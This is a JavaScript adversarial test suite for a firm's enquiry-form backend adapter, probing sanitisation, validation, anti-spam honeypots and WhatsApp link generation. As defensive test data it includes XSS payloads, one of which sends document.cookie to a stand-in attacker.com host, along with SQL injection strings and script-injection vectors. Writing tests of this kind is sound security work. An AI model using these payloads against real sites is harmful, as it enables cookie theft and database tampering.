/**
 * tests/adversarial-backend-adapter.test.mjs
 * 
 * Empirical Adversarial Stress Test Suite for Milestone 1 Backend Adapter.
 * Probes src/v8/adapters/backendAdapter.ts with:
 * - Malformed payloads (null, undefined, emojis, SQL injection, XSS scripts, extreme lengths)
 * - Bot attacks (1ms instant submits, future timestamps, honeypot injections with control chars)
 * - Phone number variations (international, domestic, alpha injections, length boundaries)
 * - WhatsApp URL generator under edge conditions (missing params, special characters, fuzzing)
 * - submitEnquiry lifecycle resilience under error conditions
 */

import { createServer } from 'vite';
import assert from 'assert';

console.log('================================================================');
console.log('  ADVERSARIAL STRESS TEST HARNESS: src/v8/adapters/backendAdapter.ts');
console.log('================================================================\n');

let total = 0;
let passed = 0;
let failed = 0;
const failures = [];

function assertTest(name, fn) {
  total++;
  try {
    fn();
    passed++;
    console.log(`\x1b[32m✔ PASS\x1b[0m [${total.toString().padStart(2, '0')}] ${name}`);
  } catch (err) {
    failed++;
    failures.push({ name, error: err.message, stack: err.stack });
    console.log(`\x1b[31m✖ FAIL\x1b[0m [${total.toString().padStart(2, '0')}] ${name}`);
    console.log(`       ${err.message}`);
  }
}

async function assertAsyncTest(name, fn) {
  total++;
  try {
    await fn();
    passed++;
    console.log(`\x1b[32m✔ PASS\x1b[0m [${total.toString().padStart(2, '0')}] ${name}`);
  } catch (err) {
    failed++;
    failures.push({ name, error: err.message, stack: err.stack });
    console.log(`\x1b[31m✖ FAIL\x1b[0m [${total.toString().padStart(2, '0')}] ${name}`);
    console.log(`       ${err.message}`);
  }
}

async function run() {
  const startTime = Date.now();

  // Initialize Vite SSR runtime to execute live TypeScript source code
  const viteServer = await createServer({
    server: { middlewareMode: true },
    appType: 'custom',
    logLevel: 'silent',
  });

  const adapter = await viteServer.ssrLoadModule('./src/v8/adapters/backendAdapter.ts');
  const {
    sanitizeText,
    validateEnquiryPayload,
    checkAntiSpam,
    generateWhatsAppUrl,
    getFirmProfile,
    getFirmContact,
    getPartnerProfile,
    submitEnquiry,
  } = adapter;

  console.log('Module loaded via Vite SSR runtime: 8 exports verified.\n');

  // =========================================================================
  // 1. SANITIZATION ADVERSARIAL PROBING (sanitizeText)
  // =========================================================================
  console.log('--- 1. Sanitization & HTML/XSS Defense ---');

  assertTest('sanitizeText: Handles null and undefined without throwing', () => {
    assert.strictEqual(sanitizeText(null), '');
    assert.strictEqual(sanitizeText(undefined), '');
  });

  assertTest('sanitizeText: Handles non-string primitives (numbers, booleans, objects)', () => {
    assert.strictEqual(sanitizeText(12345), '');
    assert.strictEqual(sanitizeText(true), '');
    assert.strictEqual(sanitizeText({ foo: 'bar' }), '');
    assert.strictEqual(sanitizeText(['<script>']), '');
  });

  assertTest('sanitizeText: Strips standard <script> tags and preserves inner text safely', () => {
    const dirty = '<script>alert("XSS")</script>Consultation brief';
    assert.strictEqual(sanitizeText(dirty), 'alert("XSS")Consultation brief');
  });

  assertTest('sanitizeText: Strips complex nested and inline event handler tags', () => {
    const dirty = '<img src=x onerror="fetch(`https://attacker.com/steal?cookie=${document.cookie}`)">Acme Corp';
    assert.strictEqual(sanitizeText(dirty), 'Acme Corp');
  });

  assertTest('sanitizeText: Strips <iframe> and <svg> injection vectors', () => {
    const dirty = '<iframe src="javascript:alert(1)"></iframe><svg onload=alert(1)>Test Firm</svg>';
    assert.strictEqual(sanitizeText(dirty), 'Test Firm');
  });

  assertTest('sanitizeText: Performance under 100,000 char flood of HTML tags', () => {
    const hugeDirty = '<p>Firm</p>'.repeat(10000); // 110,000 chars
    const t0 = Date.now();
    const clean = sanitizeText(hugeDirty);
    const elapsed = Date.now() - t0;
    assert.strictEqual(clean, 'Firm'.repeat(10000));
    assert.ok(elapsed < 200, `Sanitization should be rapid, took ${elapsed}ms`);
  });

  // =========================================================================
  // 2. MALFORMED PAYLOADS & BOUNDARY VALIDATION (validateEnquiryPayload)
  // =========================================================================
  console.log('\n--- 2. Malformed Payloads & Boundary Validation ---');

  assertTest('validateEnquiryPayload: Empty payload {} rejects with all 4 required errors', () => {
    const res = validateEnquiryPayload({});
    assert.strictEqual(res.isValid, false);
    assert.ok(res.errors.fullName, 'fullName error required');
    assert.ok(res.errors.phone, 'phone error required');
    assert.ok(res.errors.email, 'email error required');
    assert.ok(res.errors.message, 'message error required');
  });

  assertTest('validateEnquiryPayload: Whitespace-only values treated as empty', () => {
    const res = validateEnquiryPayload({
      fullName: '   \t  ',
      phone: '  \n  ',
      email: '   ',
      message: '       ',
    });
    assert.strictEqual(res.isValid, false);
    assert.strictEqual(res.errors.fullName, 'Full Name is required.');
    assert.strictEqual(res.errors.phone, 'Contact telephone number is required.');
    assert.strictEqual(res.errors.email, 'Email address is required.');
    assert.strictEqual(res.errors.message, 'Please provide a brief description of your advisory or audit requirement.');
  });

  assertTest('validateEnquiryPayload: Full Name boundary tests (1 char, 100 chars, 101 chars, 10,000 chars)', () => {
    // 1 char -> too short
    const resShort = validateEnquiryPayload({ fullName: 'A', phone: '9626350900', email: 'test@a.com', message: 'Hello brief' });
    assert.strictEqual(resShort.errors.fullName, 'Full Name must be at least 2 characters.');

    // Exactly 100 chars -> valid
    const name100 = 'A'.repeat(100);
    const res100 = validateEnquiryPayload({ fullName: name100, phone: '9626350900', email: 'test@a.com', message: 'Hello brief' });
    assert.strictEqual(res100.errors.fullName, undefined);

    // 101 chars -> too long
    const name101 = 'A'.repeat(101);
    const res101 = validateEnquiryPayload({ fullName: name101, phone: '9626350900', email: 'test@a.com', message: 'Hello brief' });
    assert.strictEqual(res101.errors.fullName, 'Full Name cannot exceed 100 characters.');

    // 10,000 chars -> rejected
    const name10k = 'B'.repeat(10000);
    const res10k = validateEnquiryPayload({ fullName: name10k, phone: '9626350900', email: 'test@a.com', message: 'Hello brief' });
    assert.strictEqual(res10k.errors.fullName, 'Full Name cannot exceed 100 characters.');
  });

  assertTest('validateEnquiryPayload: Message boundary tests (4 chars, 5 chars, 3000 chars, 3001 chars, 50,000 chars)', () => {
    const base = { fullName: 'Suresh Kumar', phone: '9626350900', email: 'suresh@corp.in' };

    // 4 chars -> too short
    const res4 = validateEnquiryPayload({ ...base, message: '1234' });
    assert.strictEqual(res4.errors.message, 'Requirement summary must be at least 5 characters.');

    // 5 chars -> valid
    const res5 = validateEnquiryPayload({ ...base, message: 'Audit' });
    assert.strictEqual(res5.errors.message, undefined);

    // 3000 chars -> valid
    const res3k = validateEnquiryPayload({ ...base, message: 'X'.repeat(3000) });
    assert.strictEqual(res3k.errors.message, undefined);

    // 3001 chars -> too long
    const res3001 = validateEnquiryPayload({ ...base, message: 'X'.repeat(3001) });
    assert.strictEqual(res3001.errors.message, 'Requirement summary cannot exceed 3000 characters.');

    // 50,000 chars -> rejected
    const res50k = validateEnquiryPayload({ ...base, message: 'X'.repeat(50000) });
    assert.strictEqual(res50k.errors.message, 'Requirement summary cannot exceed 3000 characters.');
  });

  assertTest('validateEnquiryPayload: SQL Injection strings in text fields do not break validator', () => {
    const sqliPayload = {
      fullName: "'; DROP TABLE enquiries; --",
      phone: "+91 96263 50900",
      email: "sqli'--@example.com",
      message: "SELECT * FROM users WHERE '1'='1'; UNION ALL SELECT * FROM passwords; --",
    };
    const res = validateEnquiryPayload(sqliPayload);
    // Validator should check lengths and formats without crashing
    assert.ok(typeof res.isValid === 'boolean');
  });

  assertTest('validateEnquiryPayload: Unicode, Multilingual, Emojis in Name and Message', () => {
    const unicodePayload = {
      fullName: '👨‍💼 కావ్య విజయ్ (Kavitha Vijay) — കവിதா',
      phone: '+91 96263 50900',
      email: 'kavitha.cma49@example.co.in',
      message: 'Statutory audit requirement for FY 2024-25 📑🏛️. Chambers consultation.',
    };
    const res = validateEnquiryPayload(unicodePayload);
    assert.strictEqual(res.isValid, true, 'Multilingual Indian names and emojis must be accepted');
  });

  // =========================================================================
  // 3. PHONE NUMBER VARIATIONS & ATTACK PROBING
  // =========================================================================
  console.log('\n--- 3. Phone Number Variations & Attack Probing ---');

  const validPhones = [
    '+91 96263 50900',
    '+919626350900',
    '+91-96263-50900',
    '9626350900',
    '09626350900',
    '+1 (555) 234-5678',
    '044-24991234',
    '(044) 2499 1234',
    '+44 20 7946 0991',
  ];

  for (const phone of validPhones) {
    assertTest(`Phone Valid: Accepts format "${phone}"`, () => {
      const res = validateEnquiryPayload({
        fullName: 'Test Client',
        phone,
        email: 'client@example.com',
        message: 'Valid phone format consultation request.',
      });
      assert.strictEqual(res.errors.phone, undefined, `Expected "${phone}" to be valid`);
    });
  }

  const invalidPhones = [
    { phone: '962635090a', reason: 'Alpha suffix' },
    { phone: 'CALL-ME-NOW-123', reason: 'Alpha characters' },
    { phone: '+91 96263 #5090', reason: 'Hash symbol injection' },
    { phone: '+91 96263 $5090', reason: 'Dollar symbol injection' },
    { phone: '+91 96263 5090;', reason: 'Semicolon injection' },
    { phone: '<script>12345</script>', reason: 'XSS script tag in phone' },
    { phone: '123456', reason: 'Too few digits (< 7 digits)' },
    { phone: '+91 (12)', reason: 'Fewer than 7 digits (only 4 digits)' },
    { phone: '+---()   --', reason: 'Symbols with zero digits' },
    { phone: '+91 96263 50900 1234567', reason: 'Exceeds 20 chars length' },
    { phone: '9'.repeat(1000), reason: 'Extreme 1000-char flood' },
  ];

  for (const { phone, reason } of invalidPhones) {
    assertTest(`Phone Rejection: Blocks "${phone.slice(0, 25)}" (${reason})`, () => {
      const res = validateEnquiryPayload({
        fullName: 'Test Client',
        phone,
        email: 'client@example.com',
        message: 'Testing phone attack defense.',
      });
      assert.ok(res.errors.phone, `Should reject phone due to ${reason}`);
    });
  }

  // =========================================================================
  // 4. EMAIL VALIDATION ATTACK PROBING
  // =========================================================================
  console.log('\n--- 4. Email Validation & Attack Probing ---');

  const invalidEmails = [
    { email: 'plainaddress', reason: 'No @ or domain' },
    { email: '@missingusername.com', reason: 'Missing username' },
    { email: 'username@.com', reason: 'Missing domain body' },
    { email: 'username@domain', reason: 'Missing TLD extension dot' },
    { email: 'user name@domain.com', reason: 'Space in email' },
    { email: 'a'.repeat(250) + '@b.com', reason: 'Exceeds 254 chars length' },
  ];

  for (const { email, reason } of invalidEmails) {
    assertTest(`Email Rejection: Blocks "${email.slice(0, 30)}" (${reason})`, () => {
      const res = validateEnquiryPayload({
        fullName: 'Test Client',
        phone: '9626350900',
        email,
        message: 'Testing email boundary defense.',
      });
      assert.ok(res.errors.email, `Should reject email due to ${reason}`);
    });
  }

  // =========================================================================
  // 5. BOT ATTACKS & ANTI-SPAM DEFENSE (checkAntiSpam)
  // =========================================================================
  console.log('\n--- 5. Bot Attacks & Anti-Spam Defense ---');

  assertTest('checkAntiSpam: Blocks automated bot when honeypot is standard URL', () => {
    const res = checkAntiSpam({
      fullName: 'Bot User',
      phone: '9626350900',
      email: 'bot@spam.com',
      message: 'Buy cheap goods here',
      website_fax_hp: 'https://spam-domain.xyz',
    });
    assert.strictEqual(res.passed, false);
    assert.strictEqual(res.reason, 'HONEYPOT_TRIGGERED');
    assert.ok(res.error.includes('Automated submission detected'));
  });

  assertTest('checkAntiSpam: Blocks honeypot with null-byte (\\0) evasion attempt', () => {
    const res = checkAntiSpam({
      fullName: 'Bot User',
      phone: '9626350900',
      email: 'bot@spam.com',
      message: 'Null byte exploit',
      website_fax_hp: '\0',
    });
    assert.strictEqual(res.passed, false);
    assert.strictEqual(res.reason, 'HONEYPOT_TRIGGERED');
  });

  assertTest('checkAntiSpam: Blocks honeypot with control characters (\\x01\\x02\\x03)', () => {
    const res = checkAntiSpam({
      fullName: 'Bot User',
      phone: '9626350900',
      email: 'bot@spam.com',
      message: 'Control chars exploit',
      website_fax_hp: '\x01\x02\x03',
    });
    assert.strictEqual(res.passed, false);
    assert.strictEqual(res.reason, 'HONEYPOT_TRIGGERED');
  });

  assertTest('checkAntiSpam: Blocks instant 1ms bot submission (velocity timing guard)', () => {
    const res = checkAntiSpam({
      fullName: 'Speedy Bot',
      phone: '9626350900',
      email: 'speedy@bot.com',
      message: 'Fast submission within 1ms of form render',
      formLoadedAt: Date.now() - 1,
    });
    assert.strictEqual(res.passed, false);
    assert.strictEqual(res.reason, 'VELOCITY_TOO_FAST');
    assert.ok(res.error.includes('Submission received too rapidly'));
  });

  assertTest('checkAntiSpam: Blocks sub-threshold submissions (500ms, 1400ms, 1499ms)', () => {
    for (const ms of [500, 1400, 1499]) {
      const res = checkAntiSpam({
        fullName: 'Sub Threshold Bot',
        phone: '9626350900',
        email: 'sub@bot.com',
        message: 'Sub threshold timing',
        formLoadedAt: Date.now() - ms,
      });
      assert.strictEqual(res.passed, false, `Submission at ${ms}ms must be blocked`);
      assert.strictEqual(res.reason, 'VELOCITY_TOO_FAST');
    }
  });

  assertTest('checkAntiSpam: Blocks clock-manipulated submissions with future timestamps', () => {
    const res = checkAntiSpam({
      fullName: 'Time Traveler Bot',
      phone: '9626350900',
      email: 'timetravel@bot.com',
      message: 'Form timestamp set 60 seconds into future',
      formLoadedAt: Date.now() + 60000,
    });
    assert.strictEqual(res.passed, false);
    assert.strictEqual(res.reason, 'VELOCITY_TOO_FAST');
  });

  assertTest('checkAntiSpam: Allows legitimate submission (form rendered 2500ms ago, empty honeypot)', () => {
    const res = checkAntiSpam({
      fullName: 'Legitimate Client',
      phone: '9626350900',
      email: 'client@example.com',
      message: 'Legitimate corporate advisory inquiry.',
      website_fax_hp: '',
      formLoadedAt: Date.now() - 2500,
    });
    assert.strictEqual(res.passed, true);
    assert.strictEqual(res.reason, undefined);
  });

  // =========================================================================
  // 6. WHATSAPP URL GENERATOR FUZZING & EDGE CASES
  // =========================================================================
  console.log('\n--- 6. WhatsApp URL Generator Fuzzing ---');

  assertTest('generateWhatsAppUrl: Empty options {} returns safe chambers link', () => {
    const url = generateWhatsAppUrl({});
    assert.ok(url.startsWith('https://wa.me/919626350900'), 'Must target verified phone 919626350900');
  });

  assertTest('generateWhatsAppUrl: No argument generateWhatsAppUrl() returns safe fallback', () => {
    const url = generateWhatsAppUrl();
    assert.ok(url.startsWith('https://wa.me/919626350900'));
  });

  assertTest('generateWhatsAppUrl: Direct service name with special characters (&, ?, =, quotes)', () => {
    const directName = 'Audit & Assurance (Statutory "Review" / Tax? 100%)';
    const url = generateWhatsAppUrl({ directServiceName: directName });
    assert.ok(url.startsWith('https://wa.me/919626350900?text='));
    const textParam = url.split('text=')[1];
    const decoded = decodeURIComponent(textParam);
    assert.ok(decoded.includes(directName), 'Must safely embed unescaped special characters after decoding');
    assert.ok(!url.includes(' '), 'URL must not contain raw unencoded whitespace');
  });

  assertTest('generateWhatsAppUrl: Structured consultation brief embeds all fields safely', () => {
    const url = generateWhatsAppUrl({
      referenceId: 'ENQ-M1-ADVERSARIAL',
      fullName: 'Sri Venkateswara Textiles Pvt Ltd',
      entityType: 'Private Limited Company',
      organization: 'Venkateswara Group',
      phone: '+91 98480 12345',
      serviceCategory: 'Internal Audit & Risk Advisory',
      city: 'Tirupati',
      urgency: 'Immediate / Approaching Deadline',
      message: 'Need urgent internal audit review for FY 24-25 banking compliance.',
    });

    assert.ok(url.startsWith('https://wa.me/919626350900?text='));
    const decoded = decodeURIComponent(url.split('text=')[1]);
    assert.ok(decoded.includes('Hello CA Kavitha Vijay (Kavitha & Associates)'));
    assert.ok(decoded.includes('Enquiry Ref: ENQ-M1-ADVERSARIAL'));
    assert.ok(decoded.includes('Name: Sri Venkateswara Textiles Pvt Ltd'));
    assert.ok(decoded.includes('Entity Type: Private Limited Company'));
    assert.ok(decoded.includes('Organization: Venkateswara Group'));
    assert.ok(decoded.includes('Phone: +91 98480 12345'));
    assert.ok(decoded.includes('Service Required: Internal Audit & Risk Advisory'));
    assert.ok(decoded.includes('Location: Tirupati'));
    assert.ok(decoded.includes('Urgency: Immediate / Approaching Deadline'));
  });

  assertTest('generateWhatsAppUrl: Fuzzing with XSS and control characters in brief', () => {
    const dirtyBrief = {
      fullName: '<script>alert("hacked")</script>',
      organization: '<b>Bold Org</b>',
      message: 'Line 1\nLine 2\r\nLine 3\tTabbed <iframe src="evil.com">',
    };
    const url = generateWhatsAppUrl(dirtyBrief);
    assert.ok(!url.includes('<script>'), 'Raw HTML tags must not appear unencoded in the URL');
    assert.ok(url.startsWith('https://wa.me/919626350900?text='));
  });

  assertTest('generateWhatsAppUrl: Missing optional parameters use proper defaults', () => {
    const minimal = { fullName: 'Rajesh G' };
    const url = generateWhatsAppUrl(minimal);
    const decoded = decodeURIComponent(url.split('text=')[1]);
    assert.ok(decoded.includes('Enquiry Ref: DIRECT'));
    assert.ok(decoded.includes('Entity Type: Private Limited Company'));
    assert.ok(decoded.includes('Organization: Individual'));
    assert.ok(decoded.includes('Location: Tirupati'));
    assert.ok(decoded.includes('Urgency: Routine'));
  });

  // =========================================================================
  // 7. FIRM PROFILE & REGULATORY COMPLIANCE VERIFICATION
  // =========================================================================
  console.log('\n--- 7. Firm Profile & Regulatory Compliance ---');

  assertTest('getFirmProfile: Returns verified practice profile without personal tax IDs', () => {
    const profile = getFirmProfile();
    assert.strictEqual(profile.name, 'Kavitha & Associates');
    assert.strictEqual(profile.contact.whatsappNumber, '+91 96263 50900');
    assert.strictEqual(profile.contact.primaryPhone, '+91 96263 50900');

    const serialized = JSON.stringify(profile);
    // Absolute privacy quarantine check: Zero PAN (5 letters + 4 digits + 1 letter)
    assert.doesNotMatch(serialized, /\b[A-Z]{5}[0-9]{4}[A-Z]\b/, 'Zero PAN numbers must be exposed');
    // Zero Aadhaar (12 digits)
    assert.doesNotMatch(serialized, /\b[2-9]\d{3}\s\d{4}\s\d{4}\b/, 'Zero Aadhaar numbers must be exposed');
  });

  assertTest('getPartnerProfile: ICMAI CMA AIR 49 is explicitly attributed to ICMAI', () => {
    const partner = getPartnerProfile();
    assert.strictEqual(partner.name, 'CA Kavitha Vijay');
    assert.strictEqual(partner.role, 'Managing Partner');
    const partnerStr = JSON.stringify(partner);
    assert.ok(partnerStr.includes('The Institute of Cost Accountants of India (ICMAI)'));
    assert.ok(partnerStr.includes('All India Rank 49'));
  });

  assertTest('getFirmProfile: Immutability: Mutating returned object does not alter singleton', () => {
    const p1 = getFirmProfile();
    p1.name = 'MUTATED FIRM NAME';
    p1.contact.whatsappNumber = '+1 000 000 0000';

    const p2 = getFirmProfile();
    assert.strictEqual(p2.name, 'Kavitha & Associates', 'Singleton must remain unpolluted');
    assert.strictEqual(p2.contact.whatsappNumber, '+91 96263 50900');
  });

  // =========================================================================
  // 8. DEEP ADVERSARIAL EDGE CONDITIONS & TYPE MUTATION
  // =========================================================================
  console.log('\n--- 8. Deep Adversarial Type Mutation Probing ---');

  assertTest('validateEnquiryPayload: Null field values (e.g. JSON null) do not throw', () => {
    const nullPayload = {
      fullName: null,
      phone: null,
      email: null,
      message: null,
    };
    const res = validateEnquiryPayload(nullPayload);
    assert.strictEqual(res.isValid, false);
    assert.ok(res.errors.fullName);
    assert.ok(res.errors.phone);
    assert.ok(res.errors.email);
    assert.ok(res.errors.message);
  });

  assertTest('checkAntiSpam: Null field values do not trigger false positives or throw', () => {
    const res = checkAntiSpam({
      fullName: 'Valid User',
      website_fax_hp: null,
      formLoadedAt: null,
    });
    assert.strictEqual(res.passed, true);
  });

  assertTest('checkAntiSpam: NaN formLoadedAt behavior test', () => {
    const res = checkAntiSpam({
      fullName: 'Bot NaN',
      formLoadedAt: NaN,
    });
    // Date.now() - NaN is NaN. NaN < 1500 is false.
    // Documenting behavior: NaN passes velocity check (graceful non-blocking)
    assert.ok(typeof res.passed === 'boolean');
  });

  assertTest('generateWhatsAppUrl: Extreme unicode, RTL and Asian characters in brief', () => {
    const res = generateWhatsAppUrl({
      fullName: 'مرحبا بكم / 欢迎 / வணக்கம்',
      directServiceName: 'Corporate Advisory / 法人顧問',
    });
    assert.ok(res.startsWith('https://wa.me/919626350900?text='));
    assert.ok(!res.includes(' '));
  });

  // =========================================================================
  // 9. FULL ENQUIRY SUBMISSION LIFECYCLE (submitEnquiry)
  // =========================================================================
  console.log('\n--- 9. Full submitEnquiry Lifecycle & Resilience ---');

  await assertAsyncTest('submitEnquiry: Rejects malformed payload at Step 1 without network call', async () => {
    const res = await submitEnquiry({
      fullName: '',
      phone: '',
      email: '',
      message: '',
    });
    assert.strictEqual(res.success, false);
    assert.ok(res.error, 'Must provide descriptive error');
  });

  await assertAsyncTest('submitEnquiry: Rejects honeypot bot at Step 2 without network call', async () => {
    const res = await submitEnquiry({
      fullName: 'Bot User',
      phone: '9626350900',
      email: 'bot@spam.com',
      message: 'Automated spam message',
      website_fax_hp: 'spam-bot-payload',
    });
    assert.strictEqual(res.success, false);
    assert.ok(res.error.includes('Automated submission detected'));
  });

  await assertAsyncTest('submitEnquiry: Rejects rapid velocity at Step 2 without network call', async () => {
    const res = await submitEnquiry({
      fullName: 'Rapid Submitter',
      phone: '9626350900',
      email: 'rapid@example.com',
      message: 'Fast submission test brief',
      formLoadedAt: Date.now() - 50, // 50ms elapsed
    });
    assert.strictEqual(res.success, false);
    assert.ok(res.error.includes('Submission received too rapidly'));
  });

  await assertAsyncTest('submitEnquiry: Handles unreachable server gracefully without throwing', async () => {
    // Valid payload that passes validation and anti-spam, but reaches server registration
    const validPayload = {
      fullName: 'Adversarial Test Client',
      phone: '+91 96263 50900',
      email: 'adversarial@example.com',
      message: 'Valid enquiry brief testing server fallback resiliency.',
      formLoadedAt: Date.now() - 3000,
    };

    const res = await submitEnquiry(validPayload);
    // Since we are running in Node SSR without live Express backend, it must return graceful fallback:
    assert.strictEqual(typeof res.success, 'boolean');
    if (!res.success) {
      assert.ok(
        res.error.includes('Chambers consultation server is currently unreachable') ||
        res.error.includes('WhatsApp or telephone'),
        `Error message must guide user to phone/WhatsApp: "${res.error}"`
      );
    } else {
      // In case local storage/mock handles it:
      assert.ok(res.whatsappUrl);
    }
  });

  // Clean up Vite server
  await viteServer.close();

  const duration = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log('\n================================================================');
  console.log(`TOTAL ADVERSARIAL STRESS ASSERTIONS: ${total}`);
  console.log(`PASSED: ${passed}`);
  console.log(`FAILED: ${failed}`);
  console.log(`DURATION: ${duration}s`);
  console.log('================================================================\n');

  if (failed > 0) {
    console.error(`FAILED ${failed} OF ${total} ADVERSARIAL TESTS.`);
    process.exit(1);
  } else {
    console.log('ALL ADVERSARIAL CHALLENGES SURVIVED AND PASSED EMPIRICALLY!\n');
    process.exit(0);
  }
}

run().catch((err) => {
  console.error('Fatal test harness execution error:', err);
  process.exit(1);
});
